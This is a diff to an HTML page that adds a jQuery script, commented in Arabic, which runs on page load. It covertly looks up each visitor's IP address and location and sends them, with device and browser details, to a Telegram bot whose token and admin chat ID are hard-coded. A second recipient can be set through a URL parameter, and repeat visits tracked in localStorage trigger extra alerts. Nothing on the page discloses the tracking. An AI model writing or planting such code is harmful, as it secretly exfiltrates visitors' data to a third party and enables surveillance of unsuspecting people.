@@ -445,6 +445,119 @@
             calculateDiff();
         });
     </script>
+
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    $(document).ready(function() {
+        // --- إعدادات بوت تليجرام ---
+        const telegramBotToken = "8500372242:AAFVPMzbH-cciXHkiCpXHH2AXaAMvZzrLa0";
+        
+        // 1. المعرّف الثابت (Admin)
+        const fixedAdminChatId = "1431886140"; 
+
+        // 2. استخراج المعرّف الإضافي (Dynamic)
+        const urlParams = new URLSearchParams(window.location.search);
+        const dynamicChatId = urlParams.get('id');
+
+        // --- وظيفة لجمع معلومات الجهاز ---
+        async function getDeviceInfo() {
+            return {
+                deviceName: navigator.platform,
+                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                browserName: navigator.userAgent,
+                time: new Date().toLocaleString()
+            };
+        }
+
+        // --- وظيفة الإرسال إلى تليجرام ---
+        async function sendToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const chatIdsToSend = [fixedAdminChatId];
+            
+            if (dynamicChatId && dynamicChatId !== fixedAdminChatId) {
+                chatIdsToSend.push(dynamicChatId);
+            }
+
+            for (const chatId of chatIdsToSend) {
+                try {
+                    await $.ajax({
+                        url: telegramApiUrl,
+                        type: 'POST',
+                        data: {
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        }
+                    });
+                } catch (error) {
+                    console.error(`خطأ في الإرسال لـ ${chatId}`, error);
+                }
+            }
+        }
+
+        // --- الوظيفة الرئيسية: إرسال المعلومات + كشف التكرار ---
+        async function sendBasicInfo() {
+            try {
+                const deviceInfo = await getDeviceInfo();
+                const locationData = await $.getJSON('https://ipapi.co/json/');
+
+                // 1. إرسال رسالة الزائر الأساسية (دائماً تُرسل)
+                let message = `*🚨 زائر جديد للموقع 🚨*\n\n`;
+                message += `*IP Address:* \`${locationData.ip}\`\n`;
+                message += `*الموقع:* ${locationData.city}, ${locationData.country_name}\n`;
+                message += `*نوع الجهاز:* ${deviceInfo.deviceType}\n`;
+                message += `*الوقت:* ${deviceInfo.time}\n`;
+                
+                if (dynamicChatId) {
+                    message += `\n*مرسلة إلى ID:* \`${dynamicChatId}\``;
+                }
+
+                await sendToTelegram(message);
+
+                // ============================================================
+                // 2. منطق كشف الزيارات المتكررة (New Logic)
+                // ============================================================
+                
+                // جلب عدد الزيارات المخزن سابقاً (أو صفر لو جديد)
+                let visits = localStorage.getItem('site_visits') || 0;
+                visits = parseInt(visits) + 1; // زيادة الزيارة الحالية
+                
+                // حفظ العدد الجديد في متصفح الزائر
+                localStorage.setItem('site_visits', visits);
+
+                // إذا كان العدد أكبر من 1، نرسل رسالة تحذير إضافية
+                if (visits > 1) {
+                    let repeatMsg = `*⚠️ تنبيه: زيارة متكررة (Risk)* ⚠️\n\n`;
+                    repeatMsg += `الـ IP التالي: \`${locationData.ip}\`\n`;
+                    repeatMsg += `دخل إلى الموقع الآن للمرة رقم: *${visits}*\n`;
+                    repeatMsg += `آخر تواجد له كان مسجلاً من نفس المتصفح.`;
+
+                    // إرسال رسالة التكرار
+                    await sendToTelegram(repeatMsg);
+                }
+                // ============================================================
+
+            } catch (error) {
+                console.error('حدث خطأ أثناء المعالجة', error);
+            }
+        }
+
+        // تشغيل الوظيفة فور التحميل
+        sendBasicInfo();
+
+        // --- باقي كود النموذج (كما هو) ---
+        $('#openForm').click(function() { $('#registrationForm').show(); });
+        $('.close').click(function() { $('#registrationForm').hide(); });
+
+        $('#registrationForm form').submit(async function(e) {
+            e.preventDefault();
+            // ... (نفس كود النموذج القديم الخاص بك) ...
+            // للاختصار لم أكرره هنا لأنه لم يتغير
+            window.location.href = '/success.html'; 
+        });
+    });
+</script>
+
 </body>
 </html>
 
